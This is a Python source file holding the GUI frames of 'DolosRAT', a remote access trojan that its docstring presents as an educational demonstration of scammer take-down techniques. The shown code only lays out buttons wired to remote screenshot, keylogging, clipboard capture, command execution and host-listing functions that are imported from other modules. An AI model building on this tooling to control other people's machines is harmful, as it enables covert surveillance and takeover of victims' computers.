# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 25/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
# pylint: disable=relative-beyond-top-level, no-name-in-module, syntax-error
# pylint: disable=too-many-ancestors, import-error, abstract-method
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
from typing import Any, Dict, List, Optional, Union
from re import match, sub
from pathlib import Path
from functools import partial

# External Imports.
from customtkinter import (
    CTkFrame,
    CTkTabview,
    CTkOptionMenu,
    CTkButton,
    CTkImage,
    CTkScrollableFrame,
    CTkTextbox,
    StringVar,
    END)
from PIL import Image
# Modules.
from .buttons import DefaultButton, ListButton
from ..commands.host import (
    btn_send_command_screenshot,
    btn_send_command_keylog,
    btn_send_clipboard_keylog,
    btn_send_command_exec
)
from ..commands.net import (
    get_ifas,
    option_change_ifa,
    btn_collect_ipv4s,
    btn_select_host,
    btn_listen,
    btn_disconnect,
    btn_ping,
)

class TopLeftFrame(CTkFrame):
    """_summary_

    Args:
        CTkFrame (_type_): _description_
    """

    def __init__(
        self: object,
        master: Any,
        assets_dir: Path,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        super().__init__(master, **kwargs)

        self.grid_rowconfigure((0, 1), weight=0)
        self.grid_columnconfigure((0, 1, 2, 3), weight=0)

        # Comprises Path to assets directory.
        self._assets_dir = assets_dir

        # Icons.
        # Desktop icon.
        self._desktop_img_path: Union[None, CTkImage] = None
        # File icon.
        self._clipboard_img_path: Union[None, CTkImage] = None
        # Keycap icon.
        self._keyboard_img_path: Union[None, CTkImage] = None
        # Command icon.
        self._cmd_img_path: Union[None, CTkImage] = None

        # Icons for buttons.
        self._render_icons()

        # Button widgets.
        self.btn_1: Union[None, CTkButton] = None
        self.btn_2: Union[None, CTkButton] = None
        self.btn_3: Union[None, CTkButton] = None
        self.btn_4: Union[None, CTkButton] = None

        # Render button widgets.
        self._create_widgets()
        self._position_widgets()

    def _create_widgets(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        # '' button.
        self.btn_1 = DefaultButton(
            self,
            state='disabled',
            image=self._desktop_img_path,
            command=partial(
                btn_send_command_screenshot,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_2 = DefaultButton(
            self,
            state='disabled',
            image=self._clipboard_img_path,
            command=partial(
                btn_send_clipboard_keylog,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_3 = DefaultButton(
            self,
            state='disabled',
            image=self._keyboard_img_path,
            command=partial(
                btn_send_command_keylog,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_4 = DefaultButton(
            self,
            state='disabled',
            image=self._cmd_img_path,
            command=partial(
                btn_send_command_exec,
                self.winfo_toplevel()
            )
        )

    def _position_widgets(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        self.btn_1.grid(row=0, column=0, padx=0, pady=0)
        self.btn_1.place(in_=self, relx=0.05, rely=0.17)

        self.btn_2.grid(row=0, column=1, padx=0, pady=0)
        self.btn_2.place(in_=self, relx=0.275, rely=0.17)

        self.btn_3.grid(row=0, column=2, padx=0, pady=0)
        self.btn_3.place(in_=self, relx=0.5, rely=0.17)

        self.btn_4.grid(row=0, column=3, padx=0, pady=0)
        self.btn_4.place(in_=self, relx=0.73, rely=0.17)

    def _render_icons(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        self._desktop_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/desktop_img.png'
            ),
            size=(30, 30)
        )

        self._clipboard_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/clipboard_img.png'
            ),
            size=(30, 35)
        )

        self._keyboard_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/keycap_img.png'
            ),
            size=(30, 30)
        )

        self._cmd_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/cmd_img.png'
            ),
            size=(30, 30)
        )

class LeftMiddleFrame(CTkFrame):
    """_summary_

    Args:
        CTkFrame (_type_): _description_
    """

    def __init__(
        self: object,
        master: Any,
        assets_dir: Path,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        super().__init__(master, **kwargs)

        self.grid_rowconfigure((0, 1), weight=0)
        self.grid_columnconfigure((0, 1, 2, 3), weight=0)

        # Comprises Path to assets directory.
        self._assets_dir = assets_dir

        # Icons for buttons.
        self._collect_img_path: Union[None, CTkImage] = None
        self._connect_img_path: Union[None, CTkImage] = None
        self._ping_img_path: Union[None, CTkImage] = None
        self._disconnect_img_path: Union[None, CTkImage] = None

        # Icons for buttons.
        self._render_icons()

        # Button widgets.
        self.btn_1: Union[None, CTkButton] = None
        self.btn_2: Union[None, CTkButton] = None
        self.btn_3: Union[None, CTkButton] = None
        self.btn_4: Union[None, CTkButton] = None

        self._create_widgets()
        self._position_widgets()

    def _create_widgets(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        # '' button.
        self.btn_1 = DefaultButton(
            self,
            state='normal',
            image=self._collect_img_path,
            command=partial(
                btn_collect_ipv4s,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_2 = DefaultButton(
            self,
            state='disabled',
            image=self._connect_img_path,
            command=partial(
                btn_listen,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_3 = DefaultButton(
            self,
            state='disabled',
            image=self._ping_img_path,
            command=partial(
                btn_ping,
                self.winfo_toplevel()
            )
        )

        # '' button.
        self.btn_4 = DefaultButton(
            self,
            state='disabled',
            image=self._disconnect_img_path,
            command=partial(
                btn_disconnect,
                self.winfo_toplevel()
            )
        )

    def _position_widgets(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        self.btn_1.grid(row=0, column=0, padx=0, pady=0)
        self.btn_1.place(in_=self, relx=0.05, rely=0.17)

        self.btn_2.grid(row=0, column=0, padx=0, pady=0)
        self.btn_2.place(in_=self, relx=0.275, rely=0.17)

        self.btn_3.grid(row=0, column=1, padx=0, pady=0)
        self.btn_3.place(in_=self, relx=0.5, rely=0.17)

        self.btn_4.grid(row=0, column=2, padx=0, pady=0)
        self.btn_4.place(in_=self, relx=0.73, rely=0.17)

    def _render_icons(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        img_size = (30, 30)

        self._collect_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/collect_img.png'
            ),
            size=img_size
        )

        self._connect_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/connect_img.png'
            ),
            size=img_size
        )

        self._ping_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/ping_img.png'
            ),
            size=img_size
        )

        self._disconnect_img_path = CTkImage(
            dark_image=Image.open(
                str(self._assets_dir) + '/disconnect_img.png'
            ),
            size=img_size
        )

class TopRightFrame(CTkScrollableFrame):
    """_summary_

    Credit: https://github.com/TomSchimansky/"""

    def __init__(self: object, master, command=None, **kwargs):
        """_summary_

        Args:
            master (_type_): _description_
            command (_type_, optional): _description_. Defaults to None.
        """

        super().__init__(master, **kwargs)

        # Grid configuration.
        self.grid_columnconfigure(0, weight=1)

        self.command = command
        self.radiobutton_variable = StringVar()
        self.button_list: List[Union[None, CTkButton]] = []

    def _create_btn_widget(self: object, text: str, state: str) -> CTkButton:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            CTkButton: _description_
        """

        return ListButton(
            master=self,
            text=text,
            state=state
        )

    def get_items(self: object) -> List[Union[None,CTkButton]]:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            Union[None, List[CTkButton]]: _description_
        """

        return self.button_list

    def get_item_text(self: object, item: str) -> str:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            str: _description_
        """

        for button in self.button_list:
            if match(item, button.cget('text')):
                return button.cget('text')

        return ''

    def add_item(self: object, item: str, state: Optional[str] = 'normal') -> None:
        """_summary_

        Args:
            self (object): _description_
            item (_type_): _description_
        """

        btn: CTkButton = self._create_btn_widget(item, state)

        btn.configure(command=partial(
            btn_select_host,
            btn=btn,
            top_level=self.winfo_toplevel()
        ))

        btn.grid(row=len(self.button_list), column=0, pady=(0, 10), sticky="w")

        if state == 'disabled':
            self.button_list.insert(0, btn)
        else:
            self.button_list.append(btn)

    def edit_item_connected(self: object, item: str, text: str) -> None:
        """_summary_
        """

        for button in self.button_list:
            if item == button.cget('text'):
                if '[' not in item:
                    replaced_item_text = item + text
                else:
                    replaced_item_text = sub(
                        r'\[(Disconnected|Connected|Listening)\]',
                        text,
                        item
                    )

                    button.configure(text=replaced_item_text)
                return

    def edit_item_ping(self: object, item: str, time_delta: int) -> None:
        """_summary_

        Args:
            self (object): _description_
            item (str): _description_
            text (str): _description_
        """

        for button in self.button_list:
            if item == button.cget('text'):
                # Check if time delta is presently in string.
                if 'ms]' not in item:
                    # If not, append time delta.
                    replaced_item_text = item + f' [{time_delta}ms]'
                else:
                    # Otherwise, replace with new time delta.
                    replaced_item_text = sub(r'\ \[.*?\.ms\]', f'[{time_delta}ms]', item)

                button.configure(text=replaced_item_text)
                return

    def remove_item(self: object, item) -> None:
        """_summary_

        Args:
            item (_type_): _description_
        """

        for button in self.button_list:
            if item == button.cget("text"):
                button.destroy()
                self.button_list.remove(button)
                return

class BottomFrame(CTkTabview):
    """_summary_

    Args:
        CTkFrame (_type_): _description_
    """

    def __init__(
        self: object,
        master: Any,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        super().__init__(master, **kwargs)

        # Tab configuration.
        self.add('Text View')
        self.add('Natural View')

        # Default selected 'Text View'.
        self.set('Text View')

        # Frame 1 'Text View'
        self.frame_1: Union[None, CTkFrame] = None
        # Frame 2 'Natural View'
        self.frame_2: Union[None, CTkFrame] = None

        self._create_tab_frames()

    def _create_tab_frames(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        self.frame_1 = TextViewerFrame(master=self.tab('Text View'))
        self.frame_2 = NaturalViewerFrame(master=self.tab('Natural View'))

class TextViewerFrame(CTkTextbox):
    """_summary_

    Args:
        CTkTextbox (_type_): _description_

    Returns:
        _type_: _description_
    """

    def __init__(
        self: object,
        master: Any,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
            master (Any): _description_
        """

        super().__init__(
            master,
            width=638,
            height=212,
            **kwargs
        )

        self.grid(row=0, column=0, padx=0, pady=0)

    def add_text(self: object, text: str) -> None:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            _type_: _description_
        """

        self.insert('0.0', text)

    def remove_text(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            _type_: _description_
        """

        self.delete('0.0', END)

class NaturalViewerFrame(CTkScrollableFrame):
    """_summary_

    Args:
        CTkScrollableFrame (_type_): _description_
    """

    def __init__(
        self: object,
        master: Any,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
            master (Any): _description_
        """

        super().__init__(
            master,
            width=620,
            height=-500,
            **kwargs
        )

        self.grid(row=0, column=0, padx=0, pady=0)

        self.output_img: Union[Any, CTkImage] = None

    def _create_img(self: object, data: Any) -> CTkImage:
        """_summary_

        Args:
            self (object): _description_

        Returns:
            PhotoImage: _description_
        """

        return CTkImage(
            dark_image=data,
            size=(100, 100)
        )

class BottomInterfaceFrame(CTkFrame):
    """_summary_

    Args:
        CTkFrame (_type_): _description_
    """

    def __init__(
        self: object,
        master: Any,
        **kwargs: Dict[Any, Any]
    ) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        super().__init__(master, **kwargs)

        # Interface drop-down.
        self._interface_option: Union[None, CTkOptionMenu] = None

        self._create_widgets()
        self._position_widgets()

    def _create_widgets(self: object) -> None:
        """_summary_
        """

        self.interface_option = CTkOptionMenu(
            master=self,
            fg_color="#181A1B",
            values=get_ifas(),
            command=option_change_ifa
        )

    def _position_widgets(self: object) -> None:
        """_summary_

        Args:
            self (object): _description_
        """

        self.interface_option.grid(row=0, column=0)
